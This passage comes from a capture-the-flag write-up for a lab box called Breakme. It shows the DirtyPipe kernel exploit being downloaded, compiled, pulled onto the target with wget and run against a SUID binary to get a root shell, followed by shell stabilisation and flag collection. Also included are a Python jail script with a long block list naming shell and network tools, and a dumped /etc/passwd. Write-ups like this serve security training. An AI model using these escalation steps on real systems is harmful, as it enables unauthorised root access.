   Download URL: https://haxx.in/files/dirtypipez.c
```

Locally I looked to see if DirtyPipe was installed locally but it was not so I looked online and grabbed the source code for `exploit-2.c`: 


```bash
root@ip-10-10-146-120:~# locate dirtypipe
/opt/metasploit-framework/embedded/framework/documentation/modules/exploit/linux/local/cve_2022_0847_dirtypipe.md
/opt/metasploit-framework/embedded/framework/modules/exploits/linux/local/cve_2022_0847_dirtypipe.rb
```


Compiled as so: 

```bash
root@ip-10-10-146-120:~# nano exploit-2.c
root@ip-10-10-146-120:~# gcc -o dirtypipe exploit-2.c
root@ip-10-10-146-120:~# 
```

I got root and found the 1st flag.

```bash
www-data@Breakme:/home/john$ wget http://10.10.146.120:8000/dirtypipe -O /tmp/dirtypipe
<tp://10.10.146.120:8000/dirtypipe -O /tmp/dirtypipe
--2024-09-21 10:29:08--  http://10.10.146.120:8000/dirtypipe
Connecting to 10.10.146.120:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13736 (13K) [application/octet-stream]
Saving to: \u2018/tmp/dirtypipe\u2019

/tmp/dirtypipe      100%[===================>]  13.41K  --.-KB/s    in 0s      

2024-09-21 10:29:08 (256 MB/s) - \u2018/tmp/dirtypipe\u2019 saved [13736/13736]

www-data@Breakme:/home/john$ chmod +x /tmp/dirtypipe
chmod +x /tmp/dirtypipe
www-data@Breakme:/home/john$ /tmp/dirtypipe
/tmp/dirtypipe
Usage: /tmp/dirtypipe SUID
www-data@Breakme:/home/john$ /tmp/dirtypipe /usr/bin/passwd
/tmp/dirtypipe /usr/bin/passwd
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# ls
ls
internal  user1.txt
# cat user.txt
cat user.txt
cat: user.txt: No such file or directory
# cat user1.txt
cat user1.txt
ANSWER_HERE
# whoami
whoami
root
# 
```


## Hidden 

I entered root to look for the root flag and found the recipe for the challenge. 

```bash

# whoami
whoami
root
# ls
ls
internal  user1.txt
# cd internal
cd internal
# ls
ls
index.php
# ls
ls
index.php
# cd /root
cd /root
# ls
ls
index.php  jail.py
# 

```


What is jail.py? Didn't stay too long to investigate.

```python

import os

def malicious():
    print("Illegal Input")

def main():
	while(True):
                try:
                    text = input('>> ')
                except:
                    print("Exiting...")
                    return
                for keyword in ['#',' ','}','`','"','class','?','breakpoint','eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'lower','class','init','\\','+','\u2018','readlines','bash','sh','7z', 'aa-exec', 'ab', 'agetty', 'alpine', 'ansible-playbook', 'ansible-test', 'aoss', 'apt-get', 'apt', 'ar', 'aria2c', 'arj', 'arp', 'ascii-xfr', 'ascii85', 'ash', 'aspell', 'at', 'atobm', 'awk', 'aws', 'base32', 'base58', 'base64', 'basenc', 'basez', 'bash', 'batcat', 'bc', 'bconsole', 'bpftrace', 'bridge', 'bundle', 'bundler', 'busctl', 'busybox', 'byebug', 'bzip2', 'c89', 'c99', 'cabal', 'cancel', 'capsh', 'cat', 'cdist', 'certbot', 'check_by_ssh', 'check_cups', 'check_log', 'check_memory', 'check_raid', 'check_ssl_cert', 'check_statusfile', 'chmod', 'choom', 'chown', 'chroot', 'cmp', 'cobc', 'column', 'comm', 'composer', 'cowsay', 'cowthink', 'cp', 'cpan', 'cpio', 'cpulimit', 'crash', 'crontab', 'csh', 'csplit', 'csvtool', 'cupsfilter', 'curl', 'cut', 'dash', 'date', 'dd', 'debugfs', 'dialog', 'diff', 'dig', 'distcc', 'dmesg', 'dmidecode', 'dmsetup', 'dnf', 'docker', 'dos2unix', 'dosbox', 'dotnet', 'dpkg', 'dstat', 'dvips', 'easy_install', 'eb', 'ed', 'efax', 'elvish', 'emacs', 'env', 'eqn', 'espeak', 'exiftool', 'expand', 'expect', 'facter', 'find', 'finger', 'fish', 'flock', 'fmt', 'fping', 'ftp', 'gawk', 'gcc', 'gcloud', 'gcore', 'gdb', 'gem', 'genie', 'genisoimage', 'ghc', 'ghci', 'gimp', 'ginsh', 'git', 'grc', 'grep', 'gtester', 'gzip', 'hd', 'head', 'hexdump', 'highlight', 'hping3', 'iconv', 'iftop', 'install', 'ionice', 'ip', 'irb', 'ispell', 'jjs', 'joe', 'join', 'journalctl', 'jq', 'jrunscript', 'jtag', 'julia', 'knife', 'ksh', 'ksshell', 'ksu', 'kubectl', 'latex', 'latexmk','ld.so', 'ldconfig', 'less', 'lftp', 'ln', 'loginctl', 'logsave', 'look', 'lp', 'ltrace', 'lua', 'lualatex', 'luatex', 'lwp-', 'lwp-request', 'mail', 'make', 'man', 'mawk', 'more', 'mosquitto', 'mount', 'msfconsole', 'msgattrib', 'msgcat', 'msgconv', 'msgfilter', 'msgmerge', 'msguniq', 'mtr', 'multitime', 'mv', 'mysql', 'nano', 'nasm', 'nawk', 'nc', 'ncftp', 'neofetch', 'nft', 'nice', 'nl', 'nm', 'nmap', 'node', 'nohup', 'npm', 'nroff', 'nsenter', 'octave', 'od', 'openssl', 'openvpn', 'openvt', 'opkg', 'pandoc', 'paste', 'pax', 'pdb', 'pdflatex', 'pdftex', 'perf', 'perl', 'perlbug', 'pexec', 'pg', 'php', 'pic', 'pico', 'pidstat', 'pip', 'pkexec', 'pkg', 'posh','pry', 'psftp', 'psql', 'ptx', 'puppet', 'pwsh', 'python', 'rake', 'rc', 'readelf', 'red', 'redcarpet', 'redis', 'restic', 'rev', 'rlogin', 'rlwrap', 'rpm', 'rpmdb', 'rpmquery', 'rpmverify', 'rsync', 'rtorrent', 'ruby', 'run-mailcap', 'run-parts', 'rview', 'rvim', 'sash', 'scanmem', 'scp', 'screen', 'script', 'scrot', 'sed', 'service', 'setarch', 'setfacl', 'setlock', 'sftp', 'sg', 'shuf', 'slsh', 'smbclient', 'snap', 'socat', 'socket', 'soelim', 'softlimit', 'sort', 'split', 'sqlite3', 'sqlmap', 'ss', 'ssh-agent', 'ssh-keygen', 'ssh-keyscan', 'ssh', 'sshpass', 'start-stop-daemon', 'stdbuf', 'strace', 'strings', 'su', 'sysctl', 'systemctl', 'systemd-resolve', 'tac', 'tail', 'tar', 'task', 'taskset', 'tasksh', 'tbl', 'tclsh', 'tcpdump', 'tdbtool', 'tee', 'telnet', 'tex', 'tftp', 'tic', 'time', 'timedatectl', 'timeout', 'tmate', 'tmux', 'top', 'torify', 'torsocks', 'troff', 'tshark', 'ul', 'unexpand', 'uniq', 'unshare', 'unzip', 'update-alternatives', 'uudecode', 'uuencode', 'vagrant', 'valgrind', 'vi', 'view', 'vigr', 'vim', 'vimdiff', 'vipw', 'virsh', 'volatility', 'w3m', 'wall', 'watch', 'wc', 'wget', 'whiptail', 'whois', 'wireshark', 'wish', 'xargs', 'xdotool', 'xelatex', 'xetex', 'xmodmap', 'xmore', 'xpad', 'xxd', 'xz', 'yarn', 'yash', 'yelp', 'yum', 'zathura', 'zip', 'zsh', 'zsoelim', 'zypper','&','|','$','{','>','<']:
                    if keyword in text:
                        malicious()
                        return
                try:
                    if "__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__['SYSTEM'.casefold()]('" in text:
                        if len(text)!=119 or os.path.islink(text[95:-2]):
                            malicious()
                            return
                        else:
                            if(text[95:-2]!="/lib/yorick/bin/yorick"):
                                malicious()
                                return
                            else:
                                exec(text)
                    else:
                        exec(text)
                except SyntaxError:
                    print("Wrong Input")
                except NameError:
                    print("Wrong Input")

if __name__ == "__main__":
	print("  Welcome to Python jail  ")
	print("  Will you stay locked forever  ")
	print("  Or will you BreakMe  ")
	main()

```


Tried to clear but had to set my TERM environment to allow me to use clear.

![[Pasted image 20240921105352.png]]


Then: 

```bash
export TERM=xterm
reset 
```


So, given I was in root, I stabilized root shell: 


```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'


CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

export TERM=xterm 
export SHELL=/bin/bash

# Fixes it 
stty rows 40 columns 100
```


## Root Flag

Found root: 

Found the root flag when looking into roots directory. 

![[Pasted image 20240921125424.png]]


Now, I began looking for the second flag and almost forgot there was a second user. 


```bash
root@Breakme:/root# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash
youcef:x:1000:1000:youcef,17,17,17:/home/youcef:/bin/bash


```

So, I entered the user `youcef` and found the second flag. 

```bash
root@Breakme:/root# cd youcef
cd youcef
bash: cd: youcef: No such file or directory
root@Breakme:/root# ls -la
ls -la
total 52
drwx------  3 root root 4096 Mar 21  2024 .
drwxr-xr-x 18 root root 4096 Aug 17  2021 ..
lrwxrwxrwx  1 root root    9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-rw-r--r--  1 root root    0 Mar 21  2024 .jail.py.swp
-rw-------  1 root root   33 Aug  3  2023 .lesshst
drwxr-xr-x  3 root root 4096 Aug 17  2021 .local
-rw-------  1 root root 7575 Feb  4  2024 .mysql_history
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-------  1 root root   33 Aug  3  2023 .root.txt
-rwx------  1 root root 5438 Jul 31  2023 index.php
-rw-r--r--  1 root root 5000 Mar 21  2024 jail.py
root@Breakme:/root# cd /home/youcef
cd /home/youcef
root@Breakme:/home/youcef# ls
ls
readfile  readfile.c
root@Breakme:/home/youcef# ls -la
ls -la
total 52
drwxr-x--- 4 youcef john    4096 Aug  3  2023 .
drwxr-xr-x 5 root   root    4096 Feb  3  2024 ..
lrwxrwxrwx 1 youcef youcef     9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 youcef youcef   220 Aug  1  2023 .bash_logout
-rw-r--r-- 1 youcef youcef  3526 Aug  1  2023 .bashrc
drwxr-xr-x 3 youcef youcef  4096 Aug  1  2023 .local
-rw-r--r-- 1 youcef youcef   807 Aug  1  2023 .profile
drwx------ 2 youcef youcef  4096 Aug  5  2023 .ssh
-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile
-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c
root@Breakme:/home/youcef# cat .ssh
cat .ssh
cat: .ssh: Is a directory
root@Breakme:/home/youcef# cd .ssh
cd .ssh
root@Breakme:/home/youcef/.ssh# ls
ls
authorized_keys  id_rsa  user2.txt
root@Breakme:/home/youcef/.ssh# cat user2.txt
cat user2.txt
df5b1b7f4f74a416ae27673b22633c1b
root@Breakme:/home/youcef/.ssh# 
BOOM_HERES_YOUR ANSWER
```

And there we have it. This was a fun reminder to work smarter and not always harder. 

